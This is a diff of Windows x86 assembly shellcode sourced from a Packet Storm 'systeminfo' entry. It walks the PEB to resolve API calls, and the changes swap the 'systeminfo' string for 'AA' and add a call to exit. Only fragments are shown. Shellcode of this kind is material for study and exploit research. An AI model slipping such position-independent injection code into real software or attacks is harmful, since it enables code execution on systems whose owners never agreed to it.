@@ -1,3 +1,7 @@
+https://packetstormsecurity.com/files/137452/Microsoft-Windows-x86-system-systeminfo-Shellcode.html
+
+
+
 xor ecx,ecx
 mov eax,fs:[ecx+0x30] 
 mov eax,[eax+0xc] 
@@ -74,12 +78,7 @@ mov edi,eax
 
 
 
-
-
-
-
 xor edx,edx
-push edx
 mov dx, 0x6674
 push edx
 push 0x6e697270
@@ -91,10 +90,20 @@ mov edx,esi
 call edx
  
 xor ecx,ecx
-mov cx, 0x0a66
+mov cx, 0x4141
 push ecx
-push 0x6e696d65
-push 0x74737973
 mov ecx,esp
 push ecx
+call eax 
+
+
+
+xor edx,edx
+push edx
+push 0x74697865
+mov ecx,esp
+push ecx
+push edi
+call esi
+
 call eax 
